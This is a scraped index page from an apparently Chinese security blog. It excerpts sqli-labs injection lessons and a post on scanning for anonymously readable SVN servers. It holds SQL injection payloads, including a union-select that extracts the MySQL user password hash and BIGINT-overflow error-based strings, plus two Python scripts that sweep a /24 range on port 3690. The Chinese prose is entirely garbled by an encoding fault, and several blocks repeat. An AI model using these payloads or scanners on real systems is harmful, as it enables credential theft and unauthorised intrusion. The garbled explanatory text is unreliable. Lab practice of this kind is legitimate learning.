<p>   å¯¹åº”çš„å¯ä»¥ä½¿ç”¨<code>sqlmap.py --technique </code>ä¸Šé¢é¦–å­—æ¯å¤§å†™æ¥æŒ‡å®šç›¸åº”çš„æ³¨å…¥ç±»å‹ã€‚</p>
<h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p>   ç¬¬äº”è¯¾é¦–å…ˆæ’é™¤unionæ³¨å…¥ï¼Œå› ä¸ºé¡µé¢æ— æ³•æ˜¾ç¤ºæ•°æ®ï¼Œæœ€åæˆ‘è¿˜æ˜¯çœ‹äº†ç½‘é¡µæºä»£ç æ‰æ³¨å…¥çš„ã€‚</p>
<blockquote>
<p> æˆ‘å‘ç°sqlmapåœ¨æ¯æ¬¡æ³¨å…¥çš„æ—¶å€™éƒ½ä¼šå…ˆå°è¯•ç¡®å®šå½“å‰å˜é‡æ˜¯è¢«é‚£ç§åŒ…å«ï¼Œç„¶ååœ¨payloadé‡Œé¢é—­åˆï¼Œè¿™æ ·å¯ä»¥ç¡®ä¿æ•´ä¸ªè¯­å¥çš„å®Œæ•´æ€§ã€‚ è¦ä¹ˆç¡®å®šå½“å‰è¯­å¥å®Œå…¨é—­åˆï¼Œè¦ä¹ˆæ³¨é‡Šæ‰åé¢çš„è¯­å¥ï¼Œç¡®ä¿é—­åˆã€‚</p>
</blockquote>
<h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><p>   æŠ¥é”™å’ŒunionæŸ¥è¯¢éƒ½å‡ºä¸äº†æ•°æ®ï¼Œåªèƒ½è¿›è¡Œç›²æ³¨ã€‚bool blindå’Œtime blindã€‚å‰é¢é—­åˆå¯ä»¥ä½¿ç”¨<code>&#39;</code>æˆ–è€…<code>&#39;)</code>ã€‚</p>
<h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3>
	
	</div>
  <a type="button" href="/2016/05/05/sqli-labs-less-16.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2016/04/19/sqli-labs-less-1.html" >sqli-labs-Less-1</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2016-04-19  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>  ç½‘ä¸Šå…³äºè¿™ä¸ªçš„æ¯”è¾ƒå¤šï¼Œç¬¬ä¸€èŠ‚è¯¾ç¨‹æ˜¯å•å¼•å·æ³¨å…¥ï¼Œä¸€èˆ¬è®²çš„éƒ½æ¯”è¾ƒç®€å•ï¼ŒåŠ ä¸€ä¸ªå•å¼•å·é—­åˆå°±è¡Œäº†ï¼Œä½†æ˜¯æ€ä¹ˆæ³¨å…¥æ•°æ®å‘ã€‚å› ä¸ºåˆšåˆšå¼€å§‹å­¦ï¼Œæ‰€ä»¥æˆ‘ç¿»äº†ä¸‹æºä»£ç å’Œæ•°æ®åº“ï¼Œæ³¨å…¥å‡ºæ¥çš„payloadæ˜¯è¿™æ ·çš„ï¼š<br><code>2&#39; union select group_concat(id,user()),group_concat(username,@@version),group_concat(password, (select hex(password) from mysql.user limit 1)) from users where id=3 order by id desc -- -</code></p>
<p>ç®€åŒ–ä¸€ä¸‹è¯­å¥æ˜¯è¿™æ ·çš„select * from users where id=2 union select 1,2,3,mid((select password from mysql.user limit 1),N,1) order by id</p>
<p>unionå‰åçš„å­—æ®µæ•°å¿…é¡»ä¸€æ ·ï¼Œunionåé¢çš„æ•°æ®å¯ä»¥è‡ªå·±å‘æŒ¥ï¼Œå¦‚ä½•è®©é¡µé¢æ˜¾ç¤ºæ³¨å…¥ä¹‹åæ•°æ®å¯ä»¥ä½¿ç”¨ order byï¼Œå› ä¸ºphpè¯­å¥æ˜¯åªæ˜¾ç¤ºsqlé‡Œé¢ç¬¬ä¸€è¡Œç»“æœï¼Œæ‰€ä»¥è¦è®©æˆ‘ä»¬æ³¨å…¥å‡ºæ¥çš„åœ¨ç¬¬ä¸€è¡Œæ˜¾ç¤ºã€‚ </p>
<h2 id="Error-based"><a href="#Error-based" class="headerlink" title="Error based"></a>Error based</h2><blockquote>
<p>é¦–å…ˆæŠ¥é”™æ³¨å…¥è¦æ³¨æ„é—­åˆè¯­å¥ï¼Œæ¯”å¦‚<code>id=1</code>ï¼Œå¦‚æœåœ¨PHPé‡Œé¢æ˜¯è¿™æ ·çš„<code>select * from users where id=&#39;$id&#39;</code>ï¼Œå…¶ä¸­å˜é‡æ˜¯è¢«å•å¼•å·åŒ…å›´ï¼Œåœ¨ä½¿ç”¨æŠ¥é”™æ³¨å…¥çš„æ—¶å€™ä¸€å®šè¦é—­åˆå•å¼•å·,åŒç†å…¶ä»–ç¬¦å·ä¹Ÿæ˜¯ã€‚</p>
</blockquote>
<h3 id="BIGINTæº¢å‡ºé”™è¯¯"><a href="#BIGINTæº¢å‡ºé”™è¯¯" class="headerlink" title="BIGINTæº¢å‡ºé”™è¯¯"></a>BIGINTæº¢å‡ºé”™è¯¯</h3><p>ä¸Šé¢æ˜¯unionçš„æ³¨å…¥æƒ…å†µï¼Œç„¶åæ˜¯æŠ¥é”™æ³¨å…¥å¦‚ä¸‹ï¼š<br><code>select * from users where id=1 and !(select*from(select user())x)+~0</code><br>åœ°å€æ è¾“å…¥è¿™æ ·çš„è¯­å¥<br><code>2&#39; and !(select*from(select+user())x)%2b~0</code>(æ³¨æ„å•å¼•å·é—­åˆï¼Œå¦‚æœæ²¡æœ‰é—­åˆè¿˜æ˜¯å‡ºç°æ­£å¸¸çš„ç»“æœã€‚</p>
<pre><code>æœ¬æ–‡çš„æ”»å‡»ä¹‹æ‰€ä»¥å¾—é€ï¼Œæ˜¯å› ä¸ºmysql_error()ä¼šå‘æˆ‘ä»¬è¿”å›é”™è¯¯æ¶ˆæ¯ï¼Œåªè¦è¿™æ ·ï¼Œæˆ‘ä»¬æ‰èƒ½å¤Ÿåˆ©ç”¨å®ƒæ¥è¿›è¡Œæ³¨å…¥ã€‚ è¿™ä¸€åŠŸèƒ½ï¼Œæ˜¯åœ¨5.5.5åŠå…¶ä»¥ä¸Šç‰ˆæœ¬æä¾›çš„ã€‚
</code></pre>
<p>source:<a target="_blank" rel="noopener" href="http://drops.wooyun.org/web/8024">http://drops.wooyun.org/web/8024</a></p>
<h3 id="EXPæº¢å‡ºé”™è¯¯"><a href="#EXPæº¢å‡ºé”™è¯¯" class="headerlink" title="EXPæº¢å‡ºé”™è¯¯"></a>EXPæº¢å‡ºé”™è¯¯</h3>
	

	</div>
  <a type="button" href="/2016/04/19/sqli-labs-less-1.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>  ç½‘ä¸Šå…³äºè¿™ä¸ªçš„æ¯”è¾ƒå¤šï¼Œç¬¬ä¸€èŠ‚è¯¾ç¨‹æ˜¯å•å¼•å·æ³¨å…¥ï¼Œä¸€èˆ¬è®²çš„éƒ½æ¯”è¾ƒç®€å•ï¼ŒåŠ ä¸€ä¸ªå•å¼•å·é—­åˆå°±è¡Œäº†ï¼Œä½†æ˜¯æ€ä¹ˆæ³¨å…¥æ•°æ®å‘ã€‚å› ä¸ºåˆšåˆšå¼€å§‹å­¦ï¼Œæ‰€ä»¥æˆ‘ç¿»äº†ä¸‹æºä»£ç å’Œæ•°æ®åº“ï¼Œæ³¨å…¥å‡ºæ¥çš„payloadæ˜¯è¿™æ ·çš„ï¼š<br><code>2&#39; union select group_concat(id,user()),group_concat(username,@@version),group_concat(password, (select hex(password) from mysql.user limit 1)) from users where id=3 order by id desc -- -</code></p>
<p>ç®€åŒ–ä¸€ä¸‹è¯­å¥æ˜¯è¿™æ ·çš„select * from users where id=2 union select 1,2,3,mid((select password from mysql.user limit 1),N,1) order by id</p>
<p>unionå‰åçš„å­—æ®µæ•°å¿…é¡»ä¸€æ ·ï¼Œunionåé¢çš„æ•°æ®å¯ä»¥è‡ªå·±å‘æŒ¥ï¼Œå¦‚ä½•è®©é¡µé¢æ˜¾ç¤ºæ³¨å…¥ä¹‹åæ•°æ®å¯ä»¥ä½¿ç”¨ order byï¼Œå› ä¸ºphpè¯­å¥æ˜¯åªæ˜¾ç¤ºsqlé‡Œé¢ç¬¬ä¸€è¡Œç»“æœï¼Œæ‰€ä»¥è¦è®©æˆ‘ä»¬æ³¨å…¥å‡ºæ¥çš„åœ¨ç¬¬ä¸€è¡Œæ˜¾ç¤ºã€‚ </p>
<h2 id="Error-based"><a href="#Error-based" class="headerlink" title="Error based"></a>Error based</h2><blockquote>
<p>é¦–å…ˆæŠ¥é”™æ³¨å…¥è¦æ³¨æ„é—­åˆè¯­å¥ï¼Œæ¯”å¦‚<code>id=1</code>ï¼Œå¦‚æœåœ¨PHPé‡Œé¢æ˜¯è¿™æ ·çš„<code>select * from users where id=&#39;$id&#39;</code>ï¼Œå…¶ä¸­å˜é‡æ˜¯è¢«å•å¼•å·åŒ…å›´ï¼Œåœ¨ä½¿ç”¨æŠ¥é”™æ³¨å…¥çš„æ—¶å€™ä¸€å®šè¦é—­åˆå•å¼•å·,åŒç†å…¶ä»–ç¬¦å·ä¹Ÿæ˜¯ã€‚</p>
</blockquote>
<h3 id="BIGINTæº¢å‡ºé”™è¯¯"><a href="#BIGINTæº¢å‡ºé”™è¯¯" class="headerlink" title="BIGINTæº¢å‡ºé”™è¯¯"></a>BIGINTæº¢å‡ºé”™è¯¯</h3><p>ä¸Šé¢æ˜¯unionçš„æ³¨å…¥æƒ…å†µï¼Œç„¶åæ˜¯æŠ¥é”™æ³¨å…¥å¦‚ä¸‹ï¼š<br><code>select * from users where id=1 and !(select*from(select user())x)+~0</code><br>åœ°å€æ è¾“å…¥è¿™æ ·çš„è¯­å¥<br><code>2&#39; and !(select*from(select+user())x)%2b~0</code>(æ³¨æ„å•å¼•å·é—­åˆï¼Œå¦‚æœæ²¡æœ‰é—­åˆè¿˜æ˜¯å‡ºç°æ­£å¸¸çš„ç»“æœã€‚</p>
<pre><code>æœ¬æ–‡çš„æ”»å‡»ä¹‹æ‰€ä»¥å¾—é€ï¼Œæ˜¯å› ä¸ºmysql_error()ä¼šå‘æˆ‘ä»¬è¿”å›é”™è¯¯æ¶ˆæ¯ï¼Œåªè¦è¿™æ ·ï¼Œæˆ‘ä»¬æ‰èƒ½å¤Ÿåˆ©ç”¨å®ƒæ¥è¿›è¡Œæ³¨å…¥ã€‚ è¿™ä¸€åŠŸèƒ½ï¼Œæ˜¯åœ¨5.5.5åŠå…¶ä»¥ä¸Šç‰ˆæœ¬æä¾›çš„ã€‚
</code></pre>
<p>source:<a target="_blank" rel="noopener" href="http://drops.wooyun.org/web/8024">http://drops.wooyun.org/web/8024</a></p>
<h3 id="EXPæº¢å‡ºé”™è¯¯"><a href="#EXPæº¢å‡ºé”™è¯¯" class="headerlink" title="EXPæº¢å‡ºé”™è¯¯"></a>EXPæº¢å‡ºé”™è¯¯</h3>
	
	</div>
  <a type="button" href="/2016/04/19/sqli-labs-less-1.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2016/04/15/svn-scan.html" >SVNåŒ¿åæ‰«æ</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2016-04-15  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>ç¨‹åºæ˜¯æœ€å¼€å§‹å­¦ä¹ Pythonå†™çš„ï¼ŒåŸºæœ¬æ˜¯ä¸œæ‹¼è¥¿å‡‘ï¼Œä»è¿™ä¸ªç¨‹åºå¼€å§‹æ¥è§¦å¤šè¿›ç¨‹ã€‚æœ‰ä¸¤ä¸ªç‰ˆæœ¬ç¬¬ä¸€ç§æ˜¯ç›´æ¥ä½¿ç”¨<code>sock</code>çš„<code>connect</code>è¿æ¥æ¥åˆ¤æ–­ï¼Œç¬¬äºŒç§ä½¿ç”¨äº†<code>scapy</code>ï¼Œæœ¬ç€è¿½æ±‚æœ€å¿«çš„ç¨‹åºï¼Œç»“æœä½¿ç”¨<code>scapy</code>æ¯”<code>socket</code>è¦æ…¢å¥½å¤šã€‚</p>
<p>ä¸‹é¢æ˜¯ç¬¬ä¸€ä¸ªç¨‹åºï¼Œä½¿ç”¨<code>socket</code>æ‰«æ:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># -*-coding:utf-8-*-</span>

<span class="token keyword">from</span> subprocess <span class="token keyword">import</span> Popen<span class="token punctuation">,</span>PIPE
<span class="token keyword">import</span> re
<span class="token keyword">from</span> netaddr <span class="token keyword">import</span> IPNetwork
<span class="token keyword">import</span> socket
<span class="token keyword">from</span> Queue <span class="token keyword">import</span> Queue
<span class="token keyword">import</span> threading
<span class="token keyword">import</span> time
<span class="token keyword">import</span> os

iplist <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>IPNetwork<span class="token punctuation">(</span><span class="token string">'1.2.3.4/24'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">svn_scan</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
            s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>
            s<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> s<span class="token punctuation">.</span>connect_ex<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3690</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
                p <span class="token operator">=</span> Popen<span class="token punctuation">(</span><span class="token string">"svn info svn://"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>PIPE<span class="token punctuation">,</span> stdin<span class="token operator">=</span>PIPE<span class="token punctuation">)</span>
                <span class="token punctuation">(</span>out<span class="token punctuation">,</span> err<span class="token punctuation">)</span> <span class="token operator">=</span> p<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'UUID'</span><span class="token punctuation">,</span> out<span class="token punctuation">)</span><span class="token punctuation">:</span>
                     <span class="token keyword">print</span> ip
            s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">worker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token keyword">not</span> q<span class="token punctuation">.</span>empty<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
       ip <span class="token operator">=</span> q<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>
       <span class="token keyword">try</span><span class="token punctuation">:</span>
            svn_scan<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>
       <span class="token keyword">finally</span><span class="token punctuation">:</span>
            q<span class="token punctuation">.</span>task_done<span class="token punctuation">(</span><span class="token punctuation">)</span>
start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    q <span class="token operator">=</span> Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token builtin">map</span><span class="token punctuation">(</span>q<span class="token punctuation">.</span>put<span class="token punctuation">,</span>iplist<span class="token punctuation">)</span>
    threads <span class="token operator">=</span> <span class="token punctuation">[</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>worker<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> threads<span class="token punctuation">)</span>
    q<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span> <span class="token string">'need time %s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>ç„¶åæ˜¯ä½¿ç”¨äº†<code>scapy</code>çš„<code>syn</code>æ‰«æï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
<span class="token keyword">import</span> logging
logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span><span class="token string">"scapy.runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>ERROR<span class="token punctuation">)</span> <span class="token comment">#å…³é—­import scapyçš„è­¦å‘Š</span>
<span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> netaddr <span class="token keyword">import</span> IPNetwork
<span class="token keyword">from</span> subprocess <span class="token keyword">import</span> Popen<span class="token punctuation">,</span> PIPE
<span class="token keyword">import</span> re
<span class="token keyword">import</span> time
<span class="token keyword">from</span> Queue <span class="token keyword">import</span> Queue
<span class="token keyword">import</span> threading

conf<span class="token punctuation">.</span>verb <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment">#å…³é—­è¾“å‡º</span>
targets <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>IPNetwork<span class="token punctuation">(</span><span class="token string">'1.2.3.4/24'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">svn_scan</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ans <span class="token operator">=</span> sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>target<span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span><span class="token number">3690</span><span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">"S"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> ans <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
    <span class="token keyword">elif</span> ans<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> ans<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">.</span>flags <span class="token operator">==</span> <span class="token number">18</span><span class="token punctuation">:</span>
            sr<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>target<span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span><span class="token number">3690</span><span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">"RA"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.01</span><span class="token punctuation">)</span>
            p <span class="token operator">=</span> Popen<span class="token punctuation">(</span><span class="token string">"svn info svn://"</span> <span class="token operator">+</span> target<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>PIPE<span class="token punctuation">,</span> stdin<span class="token operator">=</span>PIPE<span class="token punctuation">)</span>
            out<span class="token punctuation">,</span> err <span class="token operator">=</span> p<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span>   re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'UUID'</span><span class="token punctuation">,</span> out<span class="token punctuation">)</span> <span class="token punctuation">:</span>
                <span class="token keyword">print</span> target

<span class="token keyword">def</span> <span class="token function">worker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token keyword">not</span> q<span class="token punctuation">.</span>empty<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        item <span class="token operator">=</span> q<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            svn_scan<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">finally</span><span class="token punctuation">:</span>
            q<span class="token punctuation">.</span>task_done<span class="token punctuation">(</span><span class="token punctuation">)</span> 
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    q <span class="token operator">=</span> Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token builtin">map</span><span class="token punctuation">(</span>q<span class="token punctuation">.</span>put<span class="token punctuation">,</span> targets<span class="token punctuation">)</span>
    threads <span class="token operator">=</span> <span class="token punctuation">[</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>worker<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> threads<span class="token punctuation">)</span>
    q<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span> <span class="token string">'need time %s'</span> <span class="token operator">%</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>====2017-12-15æ›´æ–°</p>
<p>å…³äºå¤šçº¿ç¨‹ï¼Œä¸Šé¢ä¸¤ä¸ªçš„<code>q.join</code>å†™é”™äº†ï¼Œåˆ æ‰ä¹‹åæ”¹ä¸º:</p>
<pre class="line-numbers language-none"><code class="language-none">map(lambda x: x.join(), threads)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æ‰«æ<code>/24</code>çš„ä¸»æœºï¼ŒèŠ±è´¹çš„æ—¶é—´ä»8så˜ä¸ºäº†0.5sï¼Œæ—¶é—´ä¸æ˜¯è¿™ä¹ˆè®¡ç®—çš„ã€‚</p>
<p>å¦‚æœä¸Šé¢æ²¡æœ‰è®¾ç½®çº¿ç¨‹çš„daemonï¼Œæœ€åè¿è¡Œçš„æ—¶å€™ä¼šä¸€ç›´å¡ç€ï¼Œå› ä¸ºè¿›ç¨‹é»˜è®¤ä¸ä¼šåœçš„ï¼Œè¦è¿™æ ·:</p>
	

	</div>
  <a type="button" href="/2016/04/15/svn-scan.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>ç¨‹åºæ˜¯æœ€å¼€å§‹å­¦ä¹ Pythonå†™çš„ï¼ŒåŸºæœ¬æ˜¯ä¸œæ‹¼è¥¿å‡‘ï¼Œä»è¿™ä¸ªç¨‹åºå¼€å§‹æ¥è§¦å¤šè¿›ç¨‹ã€‚æœ‰ä¸¤ä¸ªç‰ˆæœ¬ç¬¬ä¸€ç§æ˜¯ç›´æ¥ä½¿ç”¨<code>sock</code>çš„<code>connect</code>è¿æ¥æ¥åˆ¤æ–­ï¼Œç¬¬äºŒç§ä½¿ç”¨äº†<code>scapy</code>ï¼Œæœ¬ç€è¿½æ±‚æœ€å¿«çš„ç¨‹åºï¼Œç»“æœä½¿ç”¨<code>scapy</code>æ¯”<code>socket</code>è¦æ…¢å¥½å¤šã€‚</p>
<p>ä¸‹é¢æ˜¯ç¬¬ä¸€ä¸ªç¨‹åºï¼Œä½¿ç”¨<code>socket</code>æ‰«æ:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># -*-coding:utf-8-*-</span>

<span class="token keyword">from</span> subprocess <span class="token keyword">import</span> Popen<span class="token punctuation">,</span>PIPE
<span class="token keyword">import</span> re
<span class="token keyword">from</span> netaddr <span class="token keyword">import</span> IPNetwork
<span class="token keyword">import</span> socket
<span class="token keyword">from</span> Queue <span class="token keyword">import</span> Queue
<span class="token keyword">import</span> threading
<span class="token keyword">import</span> time
<span class="token keyword">import</span> os

iplist <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>IPNetwork<span class="token punctuation">(</span><span class="token string">'1.2.3.4/24'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">svn_scan</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
            s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>
            s<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> s<span class="token punctuation">.</span>connect_ex<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3690</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
                p <span class="token operator">=</span> Popen<span class="token punctuation">(</span><span class="token string">"svn info svn://"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>PIPE<span class="token punctuation">,</span> stdin<span class="token operator">=</span>PIPE<span class="token punctuation">)</span>
                <span class="token punctuation">(</span>out<span class="token punctuation">,</span> err<span class="token punctuation">)</span> <span class="token operator">=</span> p<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'UUID'</span><span class="token punctuation">,</span> out<span class="token punctuation">)</span><span class="token punctuation">:</span>
                     <span class="token keyword">print</span> ip
            s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">worker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token keyword">not</span> q<span class="token punctuation">.</span>empty<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
       ip <span class="token operator">=</span> q<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>
       <span class="token keyword">try</span><span class="token punctuation">:</span>
            svn_scan<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>
       <span class="token keyword">finally</span><span class="token punctuation">:</span>
            q<span class="token punctuation">.</span>task_done<span class="token punctuation">(</span><span class="token punctuation">)</span>
start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    q <span class="token operator">=</span> Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token builtin">map</span><span class="token punctuation">(</span>q<span class="token punctuation">.</span>put<span class="token punctuation">,</span>iplist<span class="token punctuation">)</span>
